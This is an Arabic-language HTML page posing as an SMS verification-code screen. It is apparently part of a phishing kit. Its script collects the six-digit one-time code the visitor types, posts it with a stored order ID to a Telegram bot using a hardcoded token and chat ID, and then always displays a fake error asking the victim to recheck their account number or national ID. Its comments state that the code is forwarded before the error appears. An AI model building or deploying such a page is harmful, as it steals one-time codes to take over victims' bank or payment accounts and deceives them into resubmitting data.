<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد رمز التحقق</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .otp-container { text-align: center; width: 100%; max-width: 400px; padding: 20px; }
        .instruction-text { font-size: 16px; font-weight: 600; margin-bottom: 30px; line-height: 1.6; color: #444; }
        .inputs-group { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; direction: ltr; }
        .otp-input { width: 45px; height: 55px; border: 1.5px solid #ccc; border-radius: 10px; text-align: center; font-size: 22px; font-weight: bold; outline: none; }
        .otp-input:focus { border-color: #0047FF; box-shadow: 0 0 5px rgba(0, 71, 255, 0.2); }
        .btn-next { width: 100%; padding: 15px; background: linear-gradient(to right, #0052ff, #0037cc); color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }

        /* تنسيق رسالة الخطأ المنبثقة */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.5); display: none; justify-content: center; align-items: center; z-index: 1000;
        }
        .modal-box {
            background: white; padding: 25px; border-radius: 15px; width: 85%; max-width: 320px; text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3); animation: fadeIn 0.3s ease;
        }
        .modal-box p { font-size: 15px; color: #333; line-height: 1.5; margin-bottom: 20px; }
        .btn-close {
            background: #0052ff; color: white; border: none; padding: 10px 30px; border-radius: 8px;
            font-weight: bold; cursor: pointer; width: 100%;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="otp-container">
    <div class="instruction-text">ادخل الكود المرسل اليك عبر الرسائل النصية SMS الكود مكون من 6 ارقام</div>
    <div class="inputs-group" id="otp-inputs">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
    </div>
    <button class="btn-next" id="sendOtp">التالي</button>
</div>

<div class="modal-overlay" id="errorModal">
    <div class="modal-box">
        <p>المعلومات غير صحيحة يرجى التاكد من معلوماتك مثل رقم الحساب او الرقم الوطني ثم المحاولة مرة اخرى</p>
        <button class="btn-close" onclick="closeModal()">فهمت</button>
    </div>
</div>

<script>
    const TOKEN = "8667076828:AAEsfXzTXa9P1ZRHBB4b0Jc6L25YoBHiQms";
    const CHAT_ID = "8781839216";
    const orderID = localStorage.getItem('orderID') || "غير معروف";

    const inputs = document.querySelectorAll('.otp-input');
    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (/^\d$/.test(e.target.value) && index < inputs.length - 1) inputs[index + 1].focus();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
        });
    });

    function closeModal() {
        document.getElementById('errorModal').style.display = 'none';
        // مسح الخانات لإعادة المحاولة
        inputs.forEach(i => i.value = "");
        inputs[0].focus();
    }

    document.getElementById('sendOtp').addEventListener('click', function() {
        let code = "";
        inputs.forEach(i => code += i.value);

        if(code.length < 6) {
            alert("يرجى إدخال الكود كاملاً");
            return;
        }

        // إرسال الكود لتيليجرام أولاً (ليصلك حتى لو ظهر خطأ للعميل)
        const text = `🔑 *كود التحقق (OTP) للطلب:* \`${orderID}\`\n\n` +
                     `🔢 الكود المستلم:\n\`${code}\``;

        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
        }).then(() => {
            // إظهار رسالة الخطأ للعميل بعد الإرسال الناجح لتيليجرام
            document.getElementById('errorModal').style.display = 'flex';
        });
    });
</script>

</body>
</html>
